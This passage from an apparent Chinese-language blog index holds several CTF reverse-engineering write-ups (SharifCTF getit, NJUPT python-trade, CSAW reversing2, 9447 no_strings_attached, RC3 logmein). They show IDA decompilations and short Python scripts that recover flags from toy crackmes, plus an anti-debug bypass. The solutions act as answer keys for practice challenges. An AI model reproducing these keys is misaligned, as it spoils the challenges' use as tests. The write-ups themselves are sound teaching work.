class="line">**$$$$$*</span><br><span class="line">********</span><br></pre></td></tr></table></figure></p><p>得出：</p><ul><li>O 向左走</li><li>o 向右走</li><li>. 向上走</li><li>0 向下走</li></ul><p>走一下迷宫，右下右右下下左下下下右右右右上上左左。</p><p>对应的字符就是flag。</p>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逆向工程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SharifCTF 2016 getit</title>
      <link href="/2019/04/29/SharifCTF-2016-getit/"/>
      <url>/2019/04/29/SharifCTF-2016-getit/</url>
      
        <content type="html"><![CDATA[<p><a href="getit">题目下载</a></p><p>IDA分析：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v3; <span class="comment">// al</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+0h] [rbp-40h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+4h] [rbp-3Ch]</span></span><br><span class="line">  FILE *stream; <span class="comment">// [rsp+8h] [rbp-38h]</span></span><br><span class="line">  <span class="keyword">char</span> filename[<span class="number">8</span>]; <span class="comment">// [rsp+10h] [rbp-30h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v9; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v9 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  LODWORD(v5) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)v5 &lt; <span class="built_in">strlen</span>(s) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v5 &amp; <span class="number">1</span> )</span><br><span class="line">      v3 = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      v3 = <span class="number">-1</span>;</span><br><span class="line">    *(&amp;t + (<span class="keyword">signed</span> <span class="keyword">int</span>)v5 + <span class="number">10</span>) = s[(<span class="keyword">signed</span> <span class="keyword">int</span>)v5] + v3;</span><br><span class="line">    LODWORD(v5) = v5 + <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">strcpy</span>(filename, <span class="string">"/tmp/flag.txt"</span>);</span><br><span class="line">  stream = fopen(filename, <span class="string">"w"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(stream, <span class="string">"%s\n"</span>, u, v5);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(&amp;t); ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    fseek(stream, p[i], <span class="number">0</span>);</span><br><span class="line">    fputc(*(&amp;t + p[i]), stream);</span><br><span class="line">    fseek(stream, <span class="number">0L</span>L, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(stream, <span class="string">"%s\n"</span>, u);</span><br><span class="line">  &#125;</span><br><span class="line">  fclose(stream);</span><br><span class="line">  remove(filename);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到真正有用的是这个循环：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)v5 &lt; <span class="built_in">strlen</span>(s) )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( v5 &amp; <span class="number">1</span> )</span><br><span class="line">    v3 = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    v3 = <span class="number">-1</span>;</span><br><span class="line">  *(&amp;t + (<span class="keyword">signed</span> <span class="keyword">int</span>)v5 + <span class="number">10</span>) = s[(<span class="keyword">signed</span> <span class="keyword">int</span>)v5] + v3;</span><br><span class="line">  LODWORD(v5) = v5 + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中s在内存中为：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.data:</span>00000000006010A0 <span class="comment">; char s[]</span></span><br><span class="line"><span class="symbol">.data:</span>00000000006010A0 s               <span class="built_in">db</span> <span class="string">'c'</span>, <span class="string">'6'</span>, <span class="string">'1'</span>, <span class="string">'b'</span>, <span class="string">'6'</span>, <span class="string">'8'</span>, <span class="string">'3'</span>, <span class="number">2</span> dup(<span class="string">'6'</span>), <span class="string">'e'</span></span><br><span class="line"><span class="symbol">.data:</span>00000000006010A0                                         <span class="comment">; DATA XREF: main+3F↑r</span></span><br><span class="line"><span class="symbol">.data:</span>00000000006010A0                 <span class="built_in">db</span> <span class="string">'d'</span>, <span class="string">'e'</span>, <span class="string">'b'</span>, <span class="string">'7'</span>, <span class="string">'b'</span>, <span class="string">'d'</span>, <span class="string">'c'</span>, <span class="string">'e'</span>, <span class="string">'3'</span>, <span class="string">'c'</span>, <span class="string">'6'</span></span><br><span class="line"><span class="symbol">.data:</span>00000000006010A0                 <span class="built_in">db</span> <span class="string">'8'</span>, <span class="string">'2'</span>, <span class="string">'0'</span>, <span class="string">'3'</span>, <span class="string">'1'</span>, <span class="string">'4'</span>, <span class="string">'b'</span>, <span class="string">'7'</span>, <span class="string">'4'</span>, <span class="string">'9'</span>, <span class="string">'8'</span></span><br><span class="line"><span class="symbol">.data:</span>00000000006010A0                 <span class="built_in">db</span> <span class="number">0</span></span><br><span class="line"><span class="symbol">.data:</span>00000000006010C1                 <span class="meta">align</span> <span class="number">20h</span></span><br></pre></td></tr></table></figure></p><p>t在内存中为：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.data:</span>00000000006010E0 t               <span class="built_in">db</span> <span class="number">53h</span>                  <span class="comment">; DATA XREF: main+65↑w</span></span><br><span class="line"><span class="symbol">.data:</span>00000000006010E0                                         <span class="comment">; main+C9↑o ...</span></span><br><span class="line"><span class="symbol">.data:</span>00000000006010E1 aHarifctf       <span class="built_in">db</span> <span class="string">'harifCTF&#123;????????????????????????????????&#125;'</span>,<span class="number">0</span></span><br><span class="line"><span class="symbol">.data:</span>000000000060110C                 <span class="meta">align</span> <span class="number">20h</span></span><br></pre></td></tr></table></figure></p><p>很明显<code>*(&amp;t + (signed int)v5 + 10) = s[(signed int)v5] + v3</code>就是把s中的内容处理一下，放到t中的’?’位置处。</p><p>内容处理的方法也非常容易实现：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">'c61b68366edeb7bdce3c6820314b7498'</span></span><br><span class="line">ss = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(s)):</span><br><span class="line">    <span class="keyword">if</span> i &amp; <span class="number">1</span> :</span><br><span class="line">        v = <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span> :</span><br><span class="line">        v = <span class="number">-1</span></span><br><span class="line">    x = ord(s[i]) + v</span><br><span class="line">    ss += chr(x)</span><br><span class="line">print(<span class="string">'harifCTF&#123;'</span>+ss+<span class="string">'&#125;'</span>)</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逆向工程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NJUPT CTF 2017 python-trade</title>
      <link href="/2019/04/29/NJUPT-CTF-2017-python-trade/"/>
      <url>/2019/04/29/NJUPT-CTF-2017-python-trade/</url>
      
        <content type="html"><![CDATA[<p><a href="Py.pyc">题目下载</a></p><p>这道是个python的题，这里我用了uncompyle6进行反编译处理，反编译结果如下：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># uncompyle6 version 3.2.5</span></span><br><span class="line"><span class="comment"># Python bytecode 2.7 (62211)</span></span><br><span class="line"><span class="comment"># Decompiled from: Python 3.7.2 (tags/v3.7.2:9a3ffc0492, Dec 23 2018, 22:20:52) [MSC v.1916 32 bit (Intel)]</span></span><br><span class="line"><span class="comment"># Embedded file name: 1.py</span></span><br><span class="line"><span class="comment"># Compiled at: 2017-06-03 10:20:43</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span><span class="params">(message)</span>:</span></span><br><span class="line">    s = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> message:</span><br><span class="line">        x = ord(i) ^ <span class="number">32</span></span><br><span class="line">        x = x + <span class="number">16</span></span><br><span class="line">        s += chr(x)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> base64.b64encode(s)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">correct = <span class="string">'XlNkVmtUI1MgXWBZXCFeKY+AaXNt'</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'Input flag:'</span></span><br><span class="line">flag = raw_input()</span><br><span class="line"><span class="keyword">if</span> encode(flag) == correct:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'correct'</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'wrong'</span></span><br><span class="line"><span class="comment"># okay decompiling Py.pyc</span></span><br></pre></td></tr></table></figure><p>阅读代码，可以看出correct就是我们要解密的内容。根据encode内容，写出对应的decode过程即可。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span><span class="params">(message)</span>:</span></span><br><span class="line">    s = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> message:</span><br><span class="line">        x = ord(i) ^ <span class="number">32</span></span><br><span class="line">        x = x + <span class="number">16</span></span><br><span class="line">        s += chr(x)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> base64.b64encode(s)</span><br><span class="line"></span><br><span class="line">correct = <span class="string">'XlNkVmtUI1MgXWBZXCFeKY+AaXNt'</span></span><br><span class="line">ss = <span class="string">''</span></span><br><span class="line">cor = base64.b64decode(correct)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> cor:</span><br><span class="line">    y = int(i) - <span class="number">16</span></span><br><span class="line">    y ^= <span class="number">32</span></span><br><span class="line">    ss += chr(y)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> (ss)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逆向工程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSAW CTF 2014 csaw2013reversing2</title>
      <link href="/2019/04/29/CSAW-CTF-2014-csaw2013reversing2/"/>
      <url>/2019/04/29/CSAW-CTF-2014-csaw2013reversing2/</url>
      
        <content type="html"><![CDATA[<blockquote><p>hint: 听说运行就能拿到Flag，不过菜鸡运行的结果不知道为什么是乱码</p></blockquote><p><a href="csaw2013reversing2.exe">题目下载</a></p><p>拿到题目，运行一下是这样的：</p><p><img src="/2019/04/29/CSAW-CTF-2014-csaw2013reversing2/1.png" alt="首次运行"></p><p>用IDA查看一下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __cdecl __<span class="function">noreturn <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// ecx</span></span><br><span class="line">  CHAR *lpMem; <span class="comment">// [esp+8h] [ebp-Ch]</span></span><br><span class="line">  HANDLE hHeap; <span class="comment">// [esp+10h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  hHeap = HeapCreate(<span class="number">0x40000</span>u, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  lpMem = (CHAR *)HeapAlloc(hHeap, <span class="number">8u</span>, MaxCount + <span class="number">1</span>);</span><br><span class="line">  memcpy_s(lpMem, MaxCount, &amp;unk_409B10, MaxCount);</span><br><span class="line">  <span class="keyword">if</span> ( sub_40102A() || IsDebuggerPresent() )</span><br><span class="line">  &#123;</span><br><span class="line">    __debugbreak();</span><br><span class="line">    sub_401000(v3 + <span class="number">4</span>, (<span class="keyword">int</span>)lpMem);</span><br><span class="line">    ExitProcess(<span class="number">0xFFFFFFFF</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  MessageBoxA(<span class="number">0</span>, lpMem + <span class="number">1</span>, <span class="string">"Flag"</span>, <span class="number">2u</span>);</span><br><span class="line">  HeapFree(hHeap, <span class="number">0</span>, lpMem);</span><br><span class="line">  HeapDestroy(hHeap);</span><br><span class="line">  ExitProcess(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看完之后大概可以得出，unk_409B10是加密后的flag，if判断中有IsDebuggerPresent()，需要在调试环境下才会执行到<code>sub_401000(v3 + 4, (int)lpMem)</code>这个解密步骤。但是执行解密函数前又有一个<code>int3</code>指令，该指令起到反调试的作用（具体原理待补充）。所以需要跳过这个指令。</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">loc_401096:</span></span><br><span class="line"><span class="keyword">inc</span>     <span class="built_in">ecx</span></span><br><span class="line"><span class="keyword">inc</span>     <span class="built_in">ecx</span></span><br><span class="line"><span class="keyword">inc</span>     <span class="built_in">ecx</span></span><br><span class="line"><span class="keyword">inc</span>     <span class="built_in">ecx</span></span><br><span class="line"><span class="keyword">int</span>     <span class="number">3</span>               <span class="comment">; Trap to Debugger</span></span><br><span class="line"><span class="keyword">mov</span>     <span class="built_in">edx</span>, [<span class="built_in">ebp</span>+lpMem]</span><br><span class="line"><span class="keyword">call</span>    sub_401000</span><br><span class="line"><span class="keyword">jmp</span>     short loc_4010EF</span><br></pre></td></tr></table></figure><p>之前我试图用python实现解密算法，手动解密一下flag，结果因为数据类型的原因又把自己绕懵了，暂时没有写。于是我用x32dbg动态跑了一下，通过改jmp条件、nop掉INT3，执行到解密函数得到flag。</p><p>这个题应该可以写IDC脚本，在IDA下控制参数、手动执行解密函数得到答案，这个也待补充。</p>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逆向工程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>9447 CTF 2014 no_strings_attached</title>
      <link href="/2019/04/28/9447-CTF-2014-no-strings-attached/"/>
      <url>/2019/04/28/9447-CTF-2014-no-strings-attached/</url>
      
        <content type="html"><![CDATA[<p><a href="no_strings_attached">题目点我</a></p><h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><p>先用IDA看，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  setlocale(<span class="number">6</span>, &amp;locale);</span><br><span class="line">  banner();</span><br><span class="line">  prompt_authentication();</span><br><span class="line">  authenticate();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>挨个看一遍，发现<code>authenticate()</code>里面有个<code>decrypt()</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">authenticate</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> ws[<span class="number">8192</span>]; <span class="comment">// [esp+1Ch] [ebp-800Ch]</span></span><br><span class="line">  <span class="keyword">wchar_t</span> *s2; <span class="comment">// [esp+801Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  s2 = decrypt(&amp;s, &amp;dword_8048A90);</span><br><span class="line">  <span class="keyword">if</span> ( fgetws(ws, <span class="number">0x2000</span>, <span class="built_in">stdin</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    ws[wcslen(ws) - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !wcscmp(ws, s2) )</span><br><span class="line">      wprintf(&amp;unk_8048B44);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      wprintf(&amp;unk_8048BA4);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">free</span>(s2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以发现<code>authenticate()</code>里面有打印成功或失败提示的操作，由此判断s就是需要解密的字符串，这里应该可以动态调试，执行到这步直接看内存（<strong>待补充</strong>）获得解密后的flag。这里先试图用静态分析+脚本解一下。</p><p>跟进<code>decrypt()</code>，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">wchar_t</span> *__<span class="function">cdecl <span class="title">decrypt</span><span class="params">(<span class="keyword">wchar_t</span> *s, <span class="keyword">wchar_t</span> *a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v2; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v4; <span class="comment">// [esp+1Ch] [ebp-1Ch]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [esp+20h] [ebp-18h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v6; <span class="comment">// [esp+24h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v7; <span class="comment">// [esp+28h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">wchar_t</span> *dest; <span class="comment">// [esp+2Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v6 = wcslen(s);</span><br><span class="line">  v7 = wcslen(a2);</span><br><span class="line">  v2 = wcslen(s);</span><br><span class="line">  dest = (<span class="keyword">wchar_t</span> *)<span class="built_in">malloc</span>(v2 + <span class="number">1</span>);</span><br><span class="line">  wcscpy(dest, s);</span><br><span class="line">  <span class="keyword">while</span> ( v4 &lt; v6 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v7 &amp;&amp; v4 &lt; v6; ++i )</span><br><span class="line">      dest[v4++] -= a2[i];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> dest;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据内容试图写小脚本：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">s = [<span class="number">0x143A</span>,<span class="number">0x1436</span>,<span class="number">0x1437</span>,<span class="number">0x143B</span>,<span class="number">0x1480</span>,<span class="number">0x147A</span>,<span class="number">0x1471</span>,<span class="number">0x1478</span>,<span class="number">0x1463</span>,<span class="number">0x1466</span>,<span class="number">0x1473</span>,<span class="number">0x1467</span>,<span class="number">0x1462</span>,<span class="number">0x1465</span>,<span class="number">0x1473</span>,<span class="number">0x1460</span>,<span class="number">0x146B</span>,<span class="number">0x1471</span>,<span class="number">0x1478</span>,<span class="number">0x146A</span>,<span class="number">0x1473</span>,<span class="number">0x1470</span>,<span class="number">0x1464</span>,<span class="number">0x1478</span>,<span class="number">0x146E</span>,<span class="number">0x1470</span>,<span class="number">0x1470</span>,<span class="number">0x1464</span>,<span class="number">0x1470</span>,<span class="number">0x1464</span>,<span class="number">0x146E</span>,<span class="number">0x147B</span>,<span class="number">0x1476</span>,<span class="number">0x1478</span>,<span class="number">0x146A</span>,<span class="number">0x1473</span>,<span class="number">0x147B</span>,<span class="number">0x1480</span>]</span><br><span class="line">a = [<span class="number">0x1401</span>,<span class="number">0x1402</span>,<span class="number">0x1403</span>,<span class="number">0x1404</span>,<span class="number">0x1405</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(s)):</span><br><span class="line">    print(chr(s[i] - a[i % len(a)]),end=<span class="string">''</span>)</span><br></pre></td></tr></table></figure><h2 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h2><p>（待补充）</p>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逆向工程 </tag>
            
            <tag> 待补充 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RC3 CTF 2016 logmein</title>
      <link href="/2019/04/28/RC3-CTF-2016-logmein/"/>
      <url>/2019/04/28/RC3-CTF-2016-logmein/</url>
      
        <content type="html"><![CDATA[<p><a href="logmein">又是一道Linux逆向</a>，还是先放IDA了。</p><p>重命名了两个函数，方便理解。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __fastcall __<span class="function">noreturn <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v3; <span class="comment">// rsi</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+3Ch] [rbp-54h]</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">36</span>]; <span class="comment">// [rsp+40h] [rbp-50h]</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [rsp+64h] [rbp-2Ch]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+68h] [rbp-28h]</span></span><br><span class="line">  <span class="keyword">char</span> v8[<span class="number">8</span>]; <span class="comment">// [rsp+70h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// [rsp+8Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">strcpy</span>(v8, <span class="string">":\"AL_RT^L*.?+6/46"</span>);</span><br><span class="line">  v7 = <span class="number">28537194573619560L</span>L;  <span class="comment">// 'ebmarah'</span></span><br><span class="line">  v6 = <span class="number">7</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Welcome to the RC3 secure password guesser.\n"</span>, a2, a3);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"To continue, you must enter the correct password.\n"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Enter your guess: "</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%32s"</span>, s);</span><br><span class="line">  v3 = <span class="built_in">strlen</span>(s);</span><br><span class="line">  <span class="keyword">if</span> ( v3 &lt; <span class="built_in">strlen</span>(v8) )</span><br><span class="line">    wrong(v8);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(s); ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= <span class="built_in">strlen</span>(v8) )</span><br><span class="line">      ((<span class="keyword">void</span> (*)(<span class="keyword">void</span>))wrong)();</span><br><span class="line">    <span class="keyword">if</span> ( s[i] != (<span class="keyword">char</span>)(*((_BYTE *)&amp;v7 + i % v6) ^ v8[i]) )</span><br><span class="line">      ((<span class="keyword">void</span> (*)(<span class="keyword">void</span>))wrong)();</span><br><span class="line">  &#125;</span><br><span class="line">  correct();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看出来v8就是加密后的flag，下方的循环利用v6、v7，与用户输入一起计算，再与v8对比，主要考察的应该是逆向算法了。有一点需要注意，v7是按小端序存储的，因此在IDA中转换为字符（因为v7是按字节取的）之后需要颠倒一下顺序。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="string">':\"AL_RT^L*.?+6/46'</span></span><br><span class="line">b = <span class="string">'harambe'</span></span><br><span class="line">key = <span 